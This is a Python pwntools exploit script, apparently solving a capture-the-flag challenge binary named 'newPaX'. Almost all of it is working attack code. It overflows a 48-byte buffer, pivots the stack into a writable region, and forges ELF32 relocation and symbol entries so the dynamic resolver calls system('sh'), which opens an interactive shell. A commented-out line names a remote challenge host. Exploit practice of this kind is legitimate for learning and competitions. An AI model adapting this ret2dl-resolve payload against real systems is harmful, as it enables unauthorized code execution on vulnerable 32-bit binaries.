from pwn import *
context.terminal = ['tmux', 'new-window']                                                  
                                                                                  
r = process("./newPaX")                                                       
#r= remote('34.126.91.169', 6001)


elf = ELF("./newPaX")                                                         
                                                                                  
#r= gdb.debug('./newPaX') 

resolver = 0x80483e0#0x80482d0 #disass vuln; disass <read@plt> #0x80482F0    #push link_map and call dl_resolve

#Finding the writable address throught `vmmap`
buf = 0x0804a900  

#ROPGadget --binary newPaX | grep "leave"
leave_ret = 0x080484f5 #0x08048395    

#readelf -d newPaX
SYMTAB = 0x80481cc
STRTAB = 0x804829c #0x804821c
JMPREL = 0x8048378 #0x8048298

#Overflowing the buffer at 48 i.e. [40+(8)for 64bit]= 48 bytes
payload = ""
payload += "A"*48
payload += p32(buf)   #stack pivoting. (esp = buff)

#Calling read(0,buf,0x80) 
payload += p32(elf.plt["read"]) 
payload += p32(leave_ret) 
payload += p32(0) 
payload += p32(buf) 
payload += p32(0x80)

# Compute offsets and forged structures
forged_ara = buf + 0x14
rel_offset = forged_ara - JMPREL
elf32_sym = forged_ara + 0x8 #size of elf32_sym

align = 0x10 - ((elf32_sym - SYMTAB) % 0x10) #align to 0x10

elf32_sym = elf32_sym + align
index_sym = (elf32_sym - SYMTAB) / 0x10

r_info = (index_sym << 8) | 0x7

elf32_rel = p32(elf.got['read']) + p32(r_info)
st_name = (elf32_sym + 0x10) - STRTAB
elf32_sym_struct = p32(st_name) + p32(0) + p32(0) + p32(0x12)

# dl-resolve hack part

payload2 = 'AAAA'      
payload2 += p32(resolver)        
payload2 += p32(rel_offset)      
payload2 += 'AAAA'              
payload2 += p32(buf+100)         
payload2 += elf32_rel            
payload2 += 'A' * align
payload2 += elf32_sym_struct     
payload2 += "system\x00"
p = (100 - len(payload2))
payload2 += 'A' * p             
payload2 += "sh\x00"
p = (0x80 - len(payload2))
payload2 += "A" * p              
pause()
r.sendline(payload)
pause()
r.send(payload2)
r.interactive()
